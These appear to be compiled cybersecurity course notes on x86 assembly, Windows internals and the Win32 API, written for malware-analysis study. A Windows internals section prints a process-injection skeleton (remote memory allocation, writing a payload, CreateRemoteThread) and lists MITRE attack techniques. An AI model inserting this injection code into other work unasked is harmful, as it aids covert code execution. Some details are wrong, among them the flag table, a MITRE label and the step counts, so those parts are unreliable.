 operation returns 1 if both the inputs are opposite. It returns 0 when 
both inputs are the same. This operation is performed by the XOR instruction in assembly language, which performs a bitwise XOR operation on the operands. It has the following syntax.

`xor al, 0x7c`

If al has a value of 0xfc, which is 11111100, the result of this 
instruction will be 10000000 or 0x80. Similarly, if al has a value of  
0x8c, which is 10001100, the result of this instruction will be 11110000
 or 0xf0. If al has a value of 0x7c, the result will be 0x00. This shows
 that XORing a register with itself results in 0. Therefore, the XOR instruction is often used to zero a register, which is more optimized than a MOV instruction.

**Conditionals and Branching**

## Conditionals

A CPU often must determine if two values are equal to, greater than, or less than each other. To perform such operations, the CPU uses some conditional instructions. This task will discuss conditional instructions in the x86 assembly language.

### **The TEST Instruction**

The test instruction performs a bitwise AND operation, and instead of
 storing the result in the destination operand as the AND instruction 
does, it sets the Zero Flag (ZF) if the result is 0. This instruction is
 often used to check if an operand has a NULL value, for example, by 
testing the operand against itself. This is done because it takes fewer 
bytes to use the test instruction than by comparing to 0. The test 
instruction has the following syntax:

`test destination, source`

### **The CMP Instruction**

Based on the result, the CMP instruction compares the two operands 
and sets the Zero Flag (ZF) or the Carry Flag (CF). It has the following
 syntax:

`cmp destination, source`

The compare instruction works similarly to a subtract instruction. 
The only difference is that the operands are not modified. The Zero Flag
 (ZF) is set if both operands are equal. If the source operand is 
greater than the destination operand, the Carry Flag (CF) is set. The ZF
 and the CF are cleared if the destination operand is greater than the 
source operand.

## Branching

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ca7095370781c5b6d2d84b91e1b98360.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ca7095370781c5b6d2d84b91e1b98360.png)

When there is no branching, the Instruction Pointer goes from one 
instruction to the other in the order they are placed in memory. The 
control flow remains in a straight line unless there is a branching 
operation. Branching operations change the value of the Instruction 
Pointer and change the program's control flow from linear to branching 
out.

### **The JMP Instruction**

The JMP instruction makes the control flow jump to a specified location. It has the following syntax:

`jmp location`

Here, the location operand will be moved to the Instruction Pointer, 
making it the address where the next instruction will be fetched for 
execution.

### **Conditional Jumps**

Often, the code requires to move if a specific condition is met. In higher-level languages, there are `if`
 conditions that help fulfil this requirement. However, there is no if 
statement in the assembly language. This requirement is fulfilled using 
conditional jumps. Conditional jumps decide whether to jump based on the
 value of the Flag Registers. Their syntax is similar to the jump 
instruction. The following table shows some of the common conditional 
jumps.

| **Instruction** | **Explanation** |
| --- | --- |
| jz | Jump if the ZF is set (ZF=1). |
| jnz | Jump if the ZF is not set (ZF=0). |
| je | Jump if equal. Often used after a CMP instruction. |
| jne | Jump if not equal. Often used after a CMP instruction. |
| jg | Jump 
if the destination is greater than the source operand. Performs signed 
comparison and is often used after a CMP instruction. |
| jl | Jump if the destination is lesser than the source operand. Performs signed comparison and is often used after a CMP instruction. |
| jge | Jump
 if greater than or equal to. Jumps if the destination operand is 
greater than or equal to the source operand. Similar to the above 
instructions. |
| jle | Jump
 if lesser than or equal to. Jumps if the destination operand is lesser 
than or equal to the source operand. Similar to the above instructions. |
| ja | Jump if above. Similar to jg, but performs an unsigned comparison. |
| jb | Jump if below. Similar to jl, but performs an unsigned comparison. |
| jae | Jump if above or equal to. Similar to the above instructions. |
| jbe | Jump if below or equal to. Similar to the above instructions. |

**Stack and Function calls**

## The Stack

In the

[x86 Architecture Overview](https://tryhackme.com/room/x8664arch)

room,
 we learned about the stack and its significance. We also learned about 
some of the registers used to reference the location of the stack in the
 memory. The stack is a Last In, First Out (LIFO) memory. This means the
 last variable pushed onto the stack is the first to pop out. These push
 and pop operations are performed by following instructions in the 
assembly language.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/00b6f53a3983301c2070b5e212b3b586.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/00b6f53a3983301c2070b5e212b3b586.png)

### **The PUSH Instruction**

The push instruction has the following syntax:

`push source`

As mentioned earlier, the push instruction will push the source 
operand onto the stack. The value of the operand is stored at the memory
 location pointed to by the stack pointer (ESP), effectively becoming 
the new top of the stack. The stack pointer is then adjusted 
(decremented) to reflect the updated top position of the stack. The 
following instructions also push all the general-purpose registers to 
the stack.

**pusha (push all words):** Pushes all the 16-bit general purpose registers to the stack, i.e. AX, BX, CX, DX, SI, DI, SP, BP

**pushad (push all double words):** Pushes all the 32-bit general purpose registers to the stack, i.e. EAX, EBX, ECX, EDX, ESI, EDI, ESP, EBP

When we encounter these instructions, it is often a sign of someone 
manually injecting assembly instructions to save the state of registers,
 as is often the case with shellcode.

### **The POP Instruction**

The pop instruction has the following syntax:

`pop destination`

The pop instruction retrieves the value from the top of the stack and
 stores it in the destination operand. As a result, the stack pointer 
(ESP) is incremented to reflect the adjustment made after popping the 
value. The following instructions also pop all the general-purpose 
registers from the stack.

**popa (pop all words):** Pops the values sequentially from the top of 
the stack to general-purpose registers in the following order: DI, SI, 
BP, BX, DX, CX, AX. The SP or ESP is adjusted to reflect the new top position of the stack.

**popad (pop all double words):** Pops the values sequentially from the top of the stack to general-purpose registers in the following order: EDI, ESI, EBP, EBX, EDX, ECX, EAX. The SP or ESP is adjusted to reflect the new top position of the stack.

## The CALL Instruction

The call instruction is used in the assembly language for performing a
 function call operation to perform a specific task. It has the 
following syntax:

`call location`

Depending on the calling convention, the arguments are placed on the 
stack or in the registers in a function call. The function prologue 
prepares the stack by adjusting the EBP and ESP and pushing the return 
address on the stack. Similarly, when the function returns, the epilogue
 restores the stack for the caller function. We will learn more about 
calling conventions, prologue, and epilogue in the upcoming rooms.

In the next task, we will practice using assembly instructions.

**Pratice**

# Assembly Code

The
 lab contains the following assembly code instructions. Run these 
instructions and observe how these instructions impact registers, flags,
 memory, and the stack.

# Arithmetic Code

The following instructions demonstrate how different arithmetic instructions work:

```c
mov eax,20h
mov ebx,30h
add eax,ebx
nop
nop
sub eax,ebx
inc ebx
dec ebx
mul eax

```

# MOV Instructions

The following instructions demonstrate how the data can be moved:

- Into registers
- From register to register
- From memory to register
- From register to memory

Choose the **Mov Instruction** code from the emulator's dropdown, run each instruction, and observe the registers and memory.

```c
mov eax,10h
mov ebx,32h
mov ecx,eax
mov [eax],40h ; Observe the memory location [10]
add [eax],30h ; This will add 30 to the value placed at the memory location [eax]
; Is moving data from the memory location directly to the memory location allowed?
; Run the following instruction to find out.
mov [ebx],[eax]
```

# Stack

The following instructions demonstrate two instructions, `push` and `pop` used to push data into the stack and pop the data out. Choose the **Stack** code from the emulator's dropdown and observe the outcome.

```c
mov eax,10h
mov ebx, 15h
mov ecx, 20h
mov edx, 25h
; stack works from the higher memory location to the lower. Observe the stack on the right side.
push eax
push ebx
push ecx
push edx
; stack works in LIFO mode. Observe how the top of the stack is pulled out in the following instructions.
pop eax
pop ebx
pop ecx
pop edx

```

**CMP and TEST InstructionsIn the previous tasks, we explored two conditional instructions,** `test`
** and** `cmp`
**,
 which are used to compare the two values and set the flags based on the
 result. Let's visualize how the flags are changed based on the results.While
 comparing two values, there are only three possible results; each 
result has a different impact on the critical flags like ZF and CF. The 
value of the flags determines the program flow. Therefore, it is 
essential to understand which flags are impacted by each comparison 
condition.**

| **Condition** | **Example** | **Flags affected by cmp instruction** | **Flags affected by test instruction** |
| --- | --- | --- | --- |
| When both values are equal | eax = ebx | Parity Flag, Zero Flag | No flag is impacted |
| When eax is greater than ebx | eax > ebx | No flag is impacted | Parity Flag, Zero Flag |
| When eax is less than ebx | eax < ebx | Carry Flag, Sign Flag | Parity Flag, Zero Flag |

# Choose the code from the emulator's dropdown and verify the information mentioned in the table above.

```c
; Examine the flags for the test and cmp instructions when both values are the same
mov eax,10h
mov ebx,10h
cmp eax,ebx
test eax,ebx

 ; Examine the flags for the test and cmp instructions when eax > ebx
mov eax,20h
mov ebx,10h
cmp eax,ebx
test eax,ebx

 ; Examine the flags for the test and cmp instructions when eax < ebx
mov eax,20h
mov ebx,40h
cmp eax,ebx
test eax,ebx
```

# LEA Instruction

Choose the **Lea Instruction** code from the emulator's dropdown and observe the movement of the data.

```c
mov eax,20h
mov ebx,30h
add eax,ebx
nop
mov [eax],ebx
add ebx,15h
mov ecx,6
mov [ebx+ecx],eax
lea eax,[ebx+ecx]
push eax
push ebx
pop ecx
```

Understanding assembly instructions is a critical part 
of being a profound malware analyst. Practice assembly instructions and 
get comfortable with the instructions.

**Note:** The first instruction is at index 0 in the **Instructions Block**.

## **WINDOWS INTERNALS**

**Processes**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b14871cd8b0bfa82a57238d58b6ef7fd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b14871cd8b0bfa82a57238d58b6ef7fd.png)

A process maintains and represents the execution of a program; an 
application can contain one or more processes. A process has many 
components that it gets broken down into to be stored and interacted 
with. The [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads) break
 down these other components, "Each process provides the resources 
needed to execute a program. A process has a virtual address space, 
executable code, open handles to system objects, a security context, a 
unique process identifier, environment variables, a priority class, 
minimum and maximum working set sizes, and at least one thread of 
execution." This information may seem intimidating, but this room aims 
to make this concept a little less complex.

As previously 
mentioned, processes are created from the execution of an application. 
Processes are core to how Windows functions, most functionality of 
Windows can be encompassed as an application and has a corresponding 
process. Below are a few examples of default applications that start 
processes.

- MsMpEng (Microsoft Defender)
- wininit (keyboard and mouse)
- lsass (credential storage)

Attackers can target processes to evade detections and hide malware 
as legitimate processes. Below is a small list of potential attack 
vectors attackers could employ against processes,

- Process Injection ([T1055](https://attack.mitre.org/techniques/T1055/))
- Process Hollowing ([T1055.012](https://attack.mitre.org/techniques/T1055/012/))
- Process Masquerading ([T1055.013](https://attack.mitre.org/techniques/T1055/013/))

Processes have many components; they can be split into key 
characteristics that we can use to describe processes at a high level. 
The table below describes each critical component of processes and their
 purpose.

| **Process Component** | **Purpose** |
| --- | --- |
| Private Virtual Address Space | Virtual memory addresses that the process is allocated. |
| Executable Program | Defines code and data stored in the virtual address space. |
| Open Handles | Defines handles to system resources accessible to the process. |
| Security Context | The access token defines the user, security groups, privileges, and other security information. |
| Process ID | Unique numerical identifier of the process. |
| Threads | Section of a process scheduled for execution. |

We
 can also explain a process at a lower level as it resides in the 
virtual address space. The table and diagram below depict what a process
 looks like in memory.

| **Component** | **Purpose** |
| --- | --- |
| Code | Code to be executed by the process. |
| Global Variables | Stored variables. |
| Process Heap | Defines the heap where data is stored. |
| Process Resources | Defines further resources of the process. |
| Environment Block | Data structure to define process information. |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/66320022b6b57f3c40e135d66de3c1d9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/66320022b6b57f3c40e135d66de3c1d9.png)

This
 information is excellent to have when we get deeper into exploiting and
 abusing the underlying technologies, but they are still very abstract. 
We can make the process tangible by observing them in the *Windows Task Manager*.
 The task manager can report on many components and information about a 
process. Below is a table with a brief list of essential process 
details.

| **Value/Component** | **Purpose** | **Example** |
| --- | --- | --- |
| Name | Define the name of the process, typically inherited from the application | conhost.exe |
| PID | Unique numerical value to identify the process | 7408 |
| Status | Determines how the process is running (running, suspended, etc.) | Running |
| User name | User that initiated the process. Can denote privilege of the process | SYSTEM |

These are what you would interact with the most as an end-user or manipulate as an attacker.

There are multiple utilities available that make observing processes easier; including [Process Hacker 2](https://github.com/processhacker/processhacker), [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer), and [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).

Processes are at the core of most internal Windows components. 
The following tasks will extend the information about processes and how 
they're used in Windows.

**Threads**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9bd1bf463270840b282507e4c590ecf2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9bd1bf463270840b282507e4c590ecf2.png)

A thread is an executable unit employed by a process and scheduled based on device factors.

Device factors can vary based on CPU and memory specifications, priority and logical factors, and others.

We can simplify the definition of a thread: "controlling the execution of a process."

Since threads control execution, this is a commonly targeted 
component. Thread abuse can be used on its own to aid in code execution,
 or it is more widely used to chain with other API calls as part of other techniques.

Threads share the same details and resources as their parent process,
 such as code, global variables, etc. Threads also have their unique 
values and data, outlined in the table below.

| **Component** | **Purpose** |
| --- | --- |
| Stack | All data relevant and specific to the thread (exceptions, procedure calls, etc.) |
| Thread Local Storage | Pointers for allocating storage to a unique data environment |
| Stack Argument | Unique value assigned to each thread |
| Context Structure | Holds machine register values maintained by the kernel |

Threads may seem like bare-bones and simple components, but their function is critical to processes.

**Virtual Memory**

Virtual
 memory is a critical component of how Windows internals work and 
interact with each other. Virtual memory allows other internal 
components to interact with memory as if it was physical memory without 
the risk of collisions between applications. The concept of modes and 
collisions is explained further in task 8.

Virtual memory provides each process with a [private virtual address space](https://docs.microsoft.com/en-us/windows/win32/memory/virtual-address-space).
 A memory manager is used to translate virtual addresses to physical 
addresses. By having a private virtual address space and not directly 
writing to physical memory, processes have less risk of causing damage.

The memory manager will also use *pages* or *transfers* to
 handle memory. Applications may use more virtual memory than physical 
memory allocated; the memory manager will transfer or page virtual 
memory to the disk to solve this problem. You can visualize this concept
 in the diagram below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/49fb3abea645c7c5850ce3c83981fe76.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/49fb3abea645c7c5850ce3c83981fe76.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png)

The theoretical maximum virtual address space is 4 GB on a 32-bit x86 system.

This address space is split in half, the lower half (*0x00000000 - 0x7FFFFFFF*) is allocated to processes as mentioned above. The upper half (*0x80000000 - 0xFFFFFFFF*) is allocated to OS
 memory utilization. Administrators can alter this allocation layout for
 applications that require a larger address space through settings (*increaseUserVA*) or the [AWE (**A**ddress **W**indowing **E**xtensions)](https://docs.microsoft.com/en-us/windows/win32/memory/address-windowing-extensions).

The theoretical maximum virtual address space is 256 TB on a 64-bit modern system.

The exact address layout ratio from the 32-bit system is allocated to the 64-bit system.

Most issues that require settings or AWE are resolved with the increased theoretical maximum.

You can visualize both of the address space allocation layouts to the right.

Although this concept does not directly translate to Windows 
internals or concepts, it is crucial to understand. If understood 
correctly, it can be leveraged to aid in abusing Windows internals.

**Dynamic Link Libraries**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/945548ed044eca647bff352a106585bd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/945548ed044eca647bff352a106585bd.png)

The [Microsoft docs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#:~:text=A%20DLL%20is%20a%20library,common%20dialog%20box%20related%20functions.) describe a DLL as "a library that contains code and data that can be used by more than one program at the same time."

DLLs are used as one of the core functionalities behind application execution in Windows. From the [Windows documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#:~:text=A%20DLL%20is%20a%20library,common%20dialog%20box%20related%20functions.),
 "The use of DLLs helps promote modularization of code, code reuse, 
efficient memory usage, and reduced disk space. So, the operating system
 and the programs load faster, run faster, and take less disk space on 
the computer."

When a DLL is loaded as a function in a program, the DLL is assigned as a dependency. Since a program is dependent on a DLL, attackers can target the DLLs rather than the applications to control some aspect of execution or functionality.

- DLL Hijacking ([T1574.001](https://attack.mitre.org/techniques/T1574/001/))
- DLL Side-Loading ([T1574.002](https://attack.mitre.org/techniques/T1574/002/))
- DLL Injection ([T1055.001](https://attack.mitre.org/techniques/T1055/001/))

DLLs are created no different than any other 
project/application; they only require slight syntax modification to 
work. Below is an example of a DLL from the *Visual C++ Win32 Dynamic-Link Library project*.

```cpp
#include "stdafx.h"#define EXPORTING_DLL#include "sampleDLL.h"
BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved
)
{
    return TRUE;
}

void HelloWorld()
{
    MessageBox( NULL, TEXT("Hello World"), TEXT("In a DLL"), MB_OK);
}

```

Below is the header file for the DLL; it will define 
what functions are imported and exported. We will discuss the header 
file's importance (or lack of) in the next section of this task.

```cpp
#ifndef INDLL_H#define INDLL_H#ifdef EXPORTING_DLLextern __declspec(dllexport) void HelloWorld();
    #elseextern __declspec(dllimport) void HelloWorld();
    #endif#endif
```

The DLL has been created, but that still leaves the question of how are they used in an application?

DLLs can be loaded in a program using *load-time dynamic linking* or *run-time dynamic linking*.

When loaded using *load-time dynamic linking*, explicit calls to the DLL functions are made from the application. You can only achieve this type of linking by providing a header (*.h*) and import library (*.lib*) file. Below is an example of calling an exported DLL function from an application.

```cpp
#include "stdafx.h"#include "sampleDLL.h"int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HelloWorld();
    return 0;
}

```

When loaded using *run-time dynamic linking*, a separate function (`LoadLibrary` or `LoadLibraryEx`) is used to load the DLL at run time. Once loaded, you need to use `GetProcAddress` to identify the exported DLL function to call. Below is an example of loading and importing a DLL function in an application.

```cpp
...
typedef VOID (*DLLPROC) (LPTSTR);
...
HINSTANCE hinstDLL;
DLLPROC HelloWorld;
BOOL fFreeDLL;

hinstDLL = LoadLibrary("sampleDLL.dll");
if (hinstDLL != NULL)
{
    HelloWorld = (DLLPROC) GetProcAddress(hinstDLL, "HelloWorld");
    if (HelloWorld != NULL)
        (HelloWorld);
    fFreeDLL = FreeLibrary(hinstDLL);
}
...

```

In malicious code, threat actors will often use run-time dynamic 
linking more than load-time dynamic linking. This is because a malicious
 program may need to transfer files between memory regions, and 
transferring a single DLL is more manageable than importing using other file requirements.

**Portable Executable Format**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a2e6d40803c1d01beedd6e821de2e8d6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a2e6d40803c1d01beedd6e821de2e8d6.png)

Executables and applications are a large portion of how Windows internals operate at a higher level. The PE (**P**ortable **E**xecutable) format defines the information about the executable and stored data. The PE format also defines the structure of how data components are stored.

The PE (**P**ortable **E**xecutable) format is an overarching structure for executable and object files. The PE (**P**ortable **E**xecutable) and COFF (**C**ommon **O**bject **F**ile **F**ormat) files make up the PE format.

PE
 data is most commonly seen in the hex dump of an executable file. Below
 we will break down a hex dump of calc.exe into the sections of PE data.

The structure of PE data is broken up into seven components,

The **DOS Header** defines the type of file

The `MZ` DOS header defines the file format as `.exe`. The DOS header can be seen in the hex dump section below.

```
Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..........ÿÿ..
00000010  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ¸.......@.......
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000030  00 00 00 00 00 00 00 00 00 00 00 00 E8 00 00 00  ............è...
00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th
```

The **DOS Stub**
 is a program run by default at the beginning of a file that prints a 
compatibility message. This does not affect any functionality of the 
file for most users.

The DOS stub prints the message `This program cannot be run in DOS mode`.  The DOS stub can be seen in the hex dump section below.

```
00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th
00000050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno
00000060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS
00000070  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......
```

The **PE File Header** provides PE
 header information of the binary. Defines the format of the file, 
contains the signature and image file header, and other information 
headers.

The PE file header is the section with the least human-readable output. You can identify the start of the PE file header from the `PE` stub in the hex dump section below.

```
000000E0  00 00 00 00 00 00 00 00 50 45 00 00 64 86 06 00  ........PE..d†..
000000F0  10 C4 40 03 00 00 00 00 00 00 00 00 F0 00 22 00  .Ä@.........ð.".
00000100  0B 02 0E 14 00 0C 00 00 00 62 00 00 00 00 00 00  .........b......
00000110  70 18 00 00 00 10 00 00 00 00 00 40 01 00 00 00  p..........@....
00000120  00 10 00 00 00 02 00 00 0A 00 00 00 0A 00 00 00  ................
00000130  0A 00 00 00 00 00 00 00 00 B0 00 00 00 04 00 00  .........°......
00000140  63 41 01 00 02 00 60 C1 00 00 08 00 00 00 00 00  cA....`Á........
00000150  00 20 00 00 00 00 00 00 00 00 10 00 00 00 00 00  . ..............
00000160  00 10 00 00 00 00 00 00 00 00 00 00 10 00 00 00  ................
00000170  00 00 00 00 00 00 00 00 94 27 00 00 A0 00 00 00  ........”'.. ...
00000180  00 50 00 00 10 47 00 00 00 40 00 00 F0 00 00 00  .P...G...@..ð...
00000190  00 00 00 00 00 00 00 00 00 A0 00 00 2C 00 00 00  ......... ..,...
000001A0  20 23 00 00 54 00 00 00 00 00 00 00 00 00 00 00   #..T...........
000001B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000001C0  10 20 00 00 18 01 00 00 00 00 00 00 00 00 00 00  . ..............
000001D0  28 21 00 00 40 01 00 00 00 00 00 00 00 00 00 00  (!..@...........
000001E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
```

The **Image Optional Header** has a deceiving name and is an important part of the **PE File Header**

The **Data Dictionaries** are part of the image optional header. They point to the image data directory structure.

The **Section Table** will define the available 
sections and information in the image. As previously discussed, sections
 store the contents of the file, such as code, imports, and data. You 
can identify each section definition from the table in the hex dump 
section below.

```
000001F0  2E 74 65 78 74 00 00 00 D0 0B 00 00 00 10 00 00  .text...Ð.......
00000200  00 0C 00 00 00 04 00 00 00 00 00 00 00 00 00 00  ................
00000210  00 00 00 00 20 00 00 60 2E 72 64 61 74 61 00 00  .... ..`.rdata..
00000220  76 0C 00 00 00 20 00 00 00 0E 00 00 00 10 00 00  v.... ..........
00000230  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@
00000240  2E 64 61 74 61 00 00 00 B8 06 00 00 00 30 00 00  .data...¸....0..
00000250  00 02 00 00 00 1E 00 00 00 00 00 00 00 00 00 00  ................
00000260  00 00 00 00 40 00 00 C0 2E 70 64 61 74 61 00 00  ....@..À.pdata..
00000270  F0 00 00 00 00 40 00 00 00 02 00 00 00 20 00 00  ð....@....... ..
00000280  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@
00000290  2E 72 73 72 63 00 00 00 10 47 00 00 00 50 00 00  .rsrc....G...P..
000002A0  00 48 00 00 00 22 00 00 00 00 00 00 00 00 00 00  .H..."..........
000002B0  00 00 00 00 40 00 00 40 2E 72 65 6C 6F 63 00 00  ....@..@.reloc..
000002C0  2C 00 00 00 00 A0 00 00 00 02 00 00 00 6A 00 00  ,.... .......j..
000002D0  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42  ............@..B
```

Now
 that the headers have defined the format and function of the file, the 
sections can define the contents and data of the file.

| **Section** | **Purpose** |
| --- | --- |
| .text | Contains executable code and entry point |
| .data | Contains initialized data (strings, variables, etc.) |
| .rdata or .idata | Contains imports (Windows API) and DLLs. |
| .reloc | Contains relocation information |
| .rsrc | Contains application resources (images, etc.) |
| .debug | Contains debug information |

**Interacting with Windows Internals**

Interacting
 with Windows internals may seem daunting, but it has been dramatically 
simplified. The most accessible and researched option to interact with 
Windows Internals is to interface through Windows API calls. The Windows API provides native functionality to interact with the Windows operating system. The API contains the Win32 API and, less commonly, the Win64 API.

We
 will only provide a brief overview of using a few specific API calls 
relevant to Windows internals in this room. Check out the [Windows API room](https://tryhackme.com/room/windowsapi) for more information about the Windows API.

Most Windows internals components require interacting with physical hardware and memory.

The
 Windows kernel will control all programs and processes and bridge all 
software and hardware interactions. This is especially important since 
many Windows internals require interaction with memory in some form.

An
 application by default normally cannot interact with the kernel or 
modify physical hardware and requires an interface. This problem is 
solved through the use of processor modes and access levels.

A Windows processor has a *user* and *kernel* mode. The processor will switch between these modes depending on access and requested mode.

The switch between user mode and kernel mode is often facilitated
 by system and API calls. In documentation, this point is sometimes 
referred to as the "*Switching Point*."

| **User mode** | **Kernel Mode** |
| --- | --- |
| No direct hardware access | Direct hardware access |
| Creates a process in a private virtual address space | Ran in a single shared virtual address space |
| Access to "owned memory locations" | Access to entire physical memory |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2e5b0c2fccd102d477752270054facb2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2e5b0c2fccd102d477752270054facb2.png)

Applications started in user mode or "*userland"* will stay in that mode until a system call is made or interfaced through an API. When a system call is made, the application will switch modes. Pictured right is a flow chart describing this process.

When looking at how languages interact with the Win32 API, this process can become further warped; the application will go through the language runtime before going through the API. The most common example is C# executing through the CLR before interacting with the Win32 API and making system calls.

We will inject a message box into our local process to demonstrate a proof-of-concept to interact with memory.

The steps to write a message box to memory are outlined below,

1. Allocate local process memory for the message box.
2. Write/copy the message box to allocated memory.
3. Execute the message box from local process memory.

At step one, we can use `OpenProcess` to obtain the handle of the specified process.

```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments
);

```

At step two, we can use `VirtualAllocEx` to allocate a region of memory with the payload buffer.

```cpp
remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL,
	sizeof payload, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

```

At step three, we can use `WriteProcessMemory` to write the payload to the allocated region of memory.

```cpp
WriteProcessMemory(
	hProcess, // Opened target process
	remoteBuffer, // Allocated memory region
	payload, // Data to write
	sizeof payload, // byte size of data
	NULL
);
```

At step four, we can use `CreateRemoteThread` to execute our payload from memory.

```cpp
remoteThread = CreateRemoteThread(
	hProcess, // Opened target process
	NULL,
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL,
	0, // Ran immediately after creation
	NULL
);
```

## **WINDOWS API**

**Subsystem and Hardware Interaction**

Programs
 often need to access or modify Windows subsystems or hardware but are 
restricted to maintain machine stability. To solve this problem, 
Microsoft released the Win32 API, a library to interface between user-mode applications and the kernel.

Windows distinguishes hardware access by two distinct modes: **user** and **kernel mode**. These modes determine the hardware, kernel, and memory access an application or driver is permitted. API or system calls interface between each mode, sending information to the system to be processed in kernel mode.

| **User mode** | **Kernel mode** |
| --- | --- |
| No direct hardware access | Direct hardware access |
| Access to "owned" memory locations | Access to entire physical memory |

For more information about memory management, check out [Windows Internals](https://tryhackme.com/room/windowsinternals).

Below is a visual representation of how a user application can use API calls to modify kernel components.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3099761e193a0fa0eab05432b07e0537.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3099761e193a0fa0eab05432b07e0537.png)

When looking at how languages interact with the Win32 API, this process can become further warped; the application will go through the language runtime before going through the API.

For more information about the runtime, check out [Runtime Detection Evasion](https://tryhackme.com/room/runtimedetectionevasion).

**Components of the Windows API**

The Win32 API, more commonly known as the Windows API, has several dependent components that are used to define the structure and organization of the API.

Let’s break the Win32 API up via a top-down approach. We’ll assume the API
 is the top layer and the parameters that make up a specific call are 
the bottom layer. In the table below, we will describe the top-down 
structure at a high level and dive into more detail later.

| **Layer** | **Explanation** |
| --- | --- |
| API | A top-level/general term or theory used to describe any call found in the win32 API structure. |
| Header files or imports | Defines
 libraries to be imported at run-time, defined by header files or 
library imports. Uses pointers to obtain the function address. |
| Core DLLs | A
 group of four DLLs that define call structures. (KERNEL32, USER32, and 
ADVAPI32). These DLLs define kernel and user services that are not 
contained in a single subsystem. |
| Supplemental DLLs | Other DLLs defined as part of the Windows API. Controls separate subsystems of the Windows OS. ~36 other defined DLLs. (NTDLL, COM, FVEAPI, etc.) |
| Call Structures | Defines the API call itself and parameters of the call. |
| API Calls | The API call used within a program, with function addresses obtained from pointers. |
| In/Out Parameters | The parameter values that are defined by the call structures. |

Let’s
 expand these definitions; in the next task, we will discuss importing 
libraries, the core header file, and the call structure. In task 4, we 
will dive deeper into the calls, understanding where and how to digest 
call parameters and variants.

**OS Libraries**

Each API
 call of the Win32 library resides in memory and requires a pointer to a
 memory address. The process of obtaining pointers to these functions is
 obscured because of **ASLR** (**A**ddress **S**pace **L**ayout **R**andomization)
 implementations; each language or package has a unique procedure to 
overcome ASLR. Throughout this room, we will discuss the two most 
popular implementations: [**P/Invoke**](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) and the [**Windows header file**](https://docs.microsoft.com/en-us/windows/win32/winprog/using-the-windows-headers).

In
 this task, we will take a deep dive into the theory of how both of 
